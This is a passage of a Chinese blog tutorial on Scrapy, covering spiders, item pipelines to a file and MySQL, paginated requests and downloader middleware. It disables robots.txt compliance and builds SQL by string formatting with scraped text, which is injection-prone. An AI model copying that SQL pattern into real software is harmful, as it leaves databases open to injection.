class="string">&#x27;ERROR&#x27;</span></span><br></pre></td></tr></table></figure><p>不遵从robots协议</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROBOTSTXT_OBEY = <span class="literal">False</span>  </span><br></pre></td></tr></table></figure><p>指定ua</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USER_AGENT = <span class="string">&#x27;tutorial (+http://www.yourdomain.com)&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scrapy crawl first</span><br></pre></td></tr></table></figure><p>会输出一个response对象</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="number">200</span> https:<span class="regexp">//</span>www.baidu.com/&gt;</span><br></pre></td></tr></table></figure><h2 id="数据解析"><a href="#数据解析" class="headerlink" title="数据解析"></a>数据解析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://ishuo.cn/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="comment"># 返回一个selector对象</span></span><br><span class="line">        title_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> title_list:</span><br><span class="line">            <span class="built_in">print</span>(title)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到返回了一个selector对象,我们想要的数据在data属性里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro tutorial %scrapy crawl first</span><br><span class="line">&lt;Selector xpath=<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span> data=<span class="string">&#x27;如果你得罪了老板，失去的只是一份工作；如果你得罪了客户，失去的不过是一份订...&#x27;</span>&gt;</span><br><span class="line">&lt;Selector xpath=<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span> data=<span class="string">&#x27;有位非常漂亮的女同事，有天起晚了没有时间化妆便急忙冲到公司。结果那天她被记...&#x27;</span>&gt;</span><br><span class="line">&lt;Selector xpath=<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span> data=<span class="string">&#x27;悟空和唐僧一起上某卫视非诚勿扰,悟空上台,24盏灯全灭。理由:1.没房没车...&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>从data属性中取出我们想要的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://ishuo.cn/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="comment"># 返回一个selector对象</span></span><br><span class="line">        title_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> title_list:</span><br><span class="line">            <span class="comment"># 取出数据</span></span><br><span class="line">            title = title.extract()  <span class="comment"># extract_first()取第一个</span></span><br><span class="line">            <span class="built_in">print</span>(title)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="持久化存储"><a href="#持久化存储" class="headerlink" title="持久化存储"></a>持久化存储</h2><h3 id="1-基于终端指令的存储"><a href="#1-基于终端指令的存储" class="headerlink" title="1.基于终端指令的存储"></a>1.基于终端指令的存储</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://ishuo.cn/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        data_all = []</span><br><span class="line">        <span class="comment"># 返回一个selector对象</span></span><br><span class="line">        title_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> title_list:</span><br><span class="line">            <span class="comment"># 取出数据</span></span><br><span class="line">            title = title.extract()  <span class="comment"># extract_first()取第一个</span></span><br><span class="line">            <span class="comment"># 构造字典</span></span><br><span class="line">            dic = &#123;</span><br><span class="line">                <span class="string">&#x27;title&#x27;</span>: title</span><br><span class="line">            &#125;</span><br><span class="line">            data_all.append(dic)</span><br><span class="line">        <span class="comment"># 返回一个列表</span></span><br><span class="line">        <span class="keyword">return</span> data_all</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro tutorial %scrapy crawl first -o test.csv</span><br></pre></td></tr></table></figure><h3 id="2-基于管道的持久化存储"><a href="#2-基于管道的持久化存储" class="headerlink" title="2.基于管道的持久化存储"></a>2.基于管道的持久化存储</h3><p>开启管道</p><p>settings.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="string">&#x27;tutorial.pipelines.TutorialPipeline&#x27;</span>: <span class="number">300</span>,  <span class="comment"># 300表示优先级,越小优先级越高</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在items.py中定义相关属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TutorialItem</span>(scrapy.Item):</span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    <span class="comment"># Field定义好的属性当做万能属性</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将first.py提取出的数据提交给管道</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> tutorial.items <span class="keyword">import</span> TutorialItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FirstSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;first&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://ishuo.cn/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="comment"># 返回一个selector对象</span></span><br><span class="line">        title_list = response.xpath(<span class="string">&#x27;//*[@id=&quot;list&quot;]/ul/li/div[1]/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> title_list:</span><br><span class="line">            <span class="comment"># 取出数据</span></span><br><span class="line">            title = title.extract()  <span class="comment"># extract_first()取第一个</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 实例化一个item对象,将解析到的数据存入到该对象</span></span><br><span class="line">            item = TutorialItem()</span><br><span class="line">            <span class="comment"># 通过字典的方式调用</span></span><br><span class="line">            item[<span class="string">&#x27;title&#x27;</span>] = title</span><br><span class="line">            <span class="comment"># 将item对象提交给管道</span></span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在pipelines.py中重写父类方法,存储到本地</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TutorialPipeline</span>:</span><br><span class="line">    <span class="comment"># 重写父类方法</span></span><br><span class="line">    f = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_spider</span>(<span class="params">self, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是open_spider,只会在爬虫开始的时候执行一次&#x27;</span>)</span><br><span class="line">        self.f = <span class="built_in">open</span>(<span class="string">&#x27;./text1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close_spider</span>(<span class="params">self, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是close_spider,只会在爬虫开始的时候执行一次&#x27;</span>)</span><br><span class="line">        self.f.close()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 该方法是用来接收item对象的,一次只能接收一个item,说明该方法会被多次调用</span></span><br><span class="line">    <span class="comment"># 参数item就是接收的item对象</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        <span class="comment"># 存储到本地文件</span></span><br><span class="line">        self.f.write(item[<span class="string">&#x27;title&#x27;</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure><p>基于管道实现数据的备份</p><p>pipelines.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MysqlPipeline</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    conn = <span class="literal">None</span></span><br><span class="line">    cursor = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重写父类</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_spider</span>(<span class="params">self, spider</span>):</span><br><span class="line">        <span class="comment"># 数据库连接对象</span></span><br><span class="line">        self.conn = pymysql.Connect(host=<span class="string">&#x27;localhost&#x27;</span>, port=<span class="number">3306</span>, user=<span class="string">&#x27;root&#x27;</span>, password=<span class="string">&#x27;123456&#x27;</span>, charset=<span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">                                    db=<span class="string">&#x27;spider&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        self.cursor = self.conn.cursor()</span><br><span class="line">        sql = <span class="string">&#x27;insert into duanzi values(&quot;%s&quot;)&#x27;</span> % item[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        <span class="comment"># 事务处理</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.cursor.execute(sql)</span><br><span class="line">            self.conn.commit()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            self.conn.rollback()</span><br><span class="line">        <span class="comment"># 返回item会给下一个管道使用,如果不返回,下一个管道将接收不到</span></span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重写父类,关闭连接</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close_spider</span>(<span class="params">self, spider</span>):</span><br><span class="line">        self.cursor.close()</span><br><span class="line">        self.conn.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在settings.py增加一个管道</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="comment"># 爬虫文件中的item只会提交给优先级最高的那一个管道类</span></span><br><span class="line">    <span class="string">&#x27;tutorial.pipelines.TutorialPipeline&#x27;</span>: <span class="number">300</span>,</span><br><span class="line">    <span class="string">&#x27;tutorial.pipelines.MysqlPipeline&#x27;</span>: <span class="number">301</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="手动请求发送"><a href="#手动请求发送" class="headerlink" title="手动请求发送"></a>手动请求发送</h2><p>新建工程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chenci@MacBook-Pro scrapy %scrapy startproject HandReq</span><br><span class="line">chenci@MacBook-Pro scrapy %<span class="built_in">cd</span> HandReq </span><br><span class="line">chenci@MacBook-Pro HandReq %scrapy genspider duanzi www.xxx.com</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> HandReq.items <span class="keyword">import</span> HandreqItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DuanziSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;duanzi&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://duanzixing.com/page/1/&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 通用的url模板</span></span><br><span class="line">    url = <span class="string">&#x27;https://duanzixing.com/page/%d/&#x27;</span></span><br><span class="line">    page_num = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        title_list = response.xpath(<span class="string">&#x27;/html/body/section/div/div/article[1]/header/h2/a/text()&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> title_list:</span><br><span class="line">            title = title.extract()</span><br><span class="line">            item = HandreqItem()</span><br><span class="line">            item[<span class="string">&#x27;title&#x27;</span>] = title</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.page_num &lt; <span class="number">5</span>:</span><br><span class="line">            <span class="comment"># 构造页码</span></span><br><span class="line">            new_url = <span class="built_in">format</span>(self.url % self.page_num)</span><br><span class="line">            self.page_num += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 对新的url发起请求,递归回调自己</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=new_url, callback=self.parse)</span><br><span class="line">            <span class="comment"># scrapy.FormRequest(url,callback,formdata) 发送post请求</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="五大核心组件工作流程"><a href="#五大核心组件工作流程" class="headerlink" title="五大核心组件工作流程"></a>五大核心组件工作流程</h2><p><img src="/2022/04/08/scrapy%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/img.png" alt="1"></p><p>引擎(Scrapy)</p><pre><code>用来处理整个系统的数据流处理, 触发事务(框架核心)</code></pre><p>调度器(Scheduler)</p><pre><code>用来接受引擎发过来的请求, 压入队列中, 并在引擎再次请求的时候返回. 可以想像成一个URL（抓取网页的网址或者说是链接）的优先队列, 由它来决定下一个要抓取的网址是什么, 同时去除重复的网址</code></pre><p>下载器(Downloader)</p><pre><code>用于下载网页内容, 并将网页内容返回给蜘蛛(Scrapy下载器是建立在twisted这个高效的异步模型上的)</code></pre><p>爬虫(Spiders)</p><pre><code>爬虫是主要干活的, 用于从特定的网页中提取自己需要的信息, 即所谓的实体(Item)。用户也可以从中提取出链接,让Scrapy继续抓取下一个页面</code></pre><p>项目管道(Pipeline)</p><pre><code>负责处理爬虫从网页中抽取的实体，主要的功能是持久化实体、验证实体的有效性、清除不需要的信息。当页面被爬虫解析后，将被发送到项目管道，并经过几个特定的次序处理数据。</code></pre><h2 id="请求传参的深度爬取-4567kan-com"><a href="#请求传参的深度爬取-4567kan-com" class="headerlink" title="请求传参的深度爬取-4567kan.com"></a>请求传参的深度爬取-4567kan.com</h2><p>文件目录</p><p><img src="/2022/04/08/scrapy%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/img_1.png" alt="1"></p><pre><code>meta是一个字典,可以将meta传给callback    scrapy.Request(url, callback, meta)callback取出字典    item = response.meta[&#39;item&#39;]</code></pre><p>move.py 项目文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> move_4567kan.items <span class="keyword">import</span> Move4567KanItem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MoveSpider</span>(scrapy.Spider):</span><br><span class="line">    name = <span class="string">&#x27;move&#x27;</span></span><br><span class="line">    <span class="comment"># allowed_domains = [&#x27;www.xxx.com&#x27;]</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://www.4567kan.com/frim/index1-1.html&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造页码</span></span><br><span class="line">    url = <span class="string">&#x27;https://www.4567kan.com/frim/index1-%d.html&#x27;</span></span><br><span class="line">    page_num = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="comment"># 抓取url和title</span></span><br><span class="line">        li_list = response.xpath(<span class="string">&#x27;/html/body/div[2]/div/div[3]/div/div[2]/ul/li&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> li <span class="keyword">in</span> li_list:</span><br><span class="line">            url = <span class="string">&#x27;https://www.4567kan.com&#x27;</span> + li.xpath(<span class="string">&#x27;./div/a/@href&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line">            title = li.xpath(<span class="string">&#x27;./div/a/@title&#x27;</span>).extract()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 传递给item</span></span><br><span class="line">            item = Move4567KanItem()</span><br><span class="line">            item[<span class="string">&#x27;title&#x27;</span>] = title</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 对详情页发起请求,回调get_details函数</span></span><br><span class="line">            <span class="comment"># meta请求传参,以字典形式,传给get_details函数,因为item只能是唯一</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=url, callback=self.get_details, meta=&#123;<span class="string">&#x27;item&#x27;</span>: item&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 爬取多页</span></span><br><span class="line">        <span class="keyword">if</span> self.page_num &lt; <span class="number">5</span>:</span><br><span class="line">            <span class="comment"># 构造页码</span></span><br><span class="line">            new_url = <span class="built_in">format</span>(self.url % self.page_num)</span><br><span class="line">            self.page_num += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 对新的url发起请求,递归回调自己</span></span><br><span class="line">            <span class="keyword">yield</span> scrapy.Request(url=new_url, callback=self.parse)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 自定义函数去抓取详情</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_details</span>(<span class="params">self, response</span>):</span><br><span class="line">        details = response.xpath(<span class="string">&#x27;//*[@class=&quot;detail-content&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">        <span class="comment"># 判断,没有返回None</span></span><br><span class="line">        <span class="keyword">if</span> details:</span><br><span class="line">            details = details[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            details = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># 接受item</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        item[<span class="string">&#x27;details&#x27;</span>] = details</span><br><span class="line">        <span class="comment"># 提交给管道</span></span><br><span class="line">        <span class="keyword">yield</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>items.py 定义两个字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Move4567KanItem</span>(scrapy.Item):</span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    title = scrapy.Field()</span><br><span class="line">    details = scrapy.Field()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>pipelines.py 打印输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Move4567KanPipeline</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_item</span>(<span class="params">self, item, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="keyword">return</span> item</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><p>作用</p><pre><code>拦截请求和响应</code></pre><p>爬虫中间件</p><pre><code>略</code></pre><p>下载中间件(推荐)</p><pre><code>拦截请求:        1.篡改请求url    2.伪装请求头信息:        UA        Cookie    3.设置请求代理拦截响应:    篡改响应数据</code></pre><p>改写中间件文件 middlewares.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> signals</span><br><span class="line"><span class="keyword">from</span> itemadapter <span class="keyword">import</span> is_item, ItemAdapter</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MiddleDownloaderMiddleware</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拦截所有请求</span></span><br><span class="line">    <span class="comment"># request就是拦截到的请求,spider就是爬虫类实例化的对象</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_request</span>(<span class="params">self, request, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是process_request()&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拦截所有响应对象</span></span><br><span class="line">    <span class="comment"># request就是response响应对象对应的请求对象,response就是拦截到的响应对象</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_response</span>(<span class="params">self, request, response, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是process_response()&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拦截异常请求</span></span><br><span class="line">    <span class="comment"># request就是拦截到的异常请求的请求对象</span></span><br><span class="line">    <span class="comment"># 作用:修正异常请求,将其 重新发送</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">process_exception</span>(<span class="params">self, request, exception, spider</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;我是process_exception()&#x27;</span>)</span><br><span class="line">        <span class="comment"># pass</span></span><br></pre></td></tr></table></figure><p>编写爬虫文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 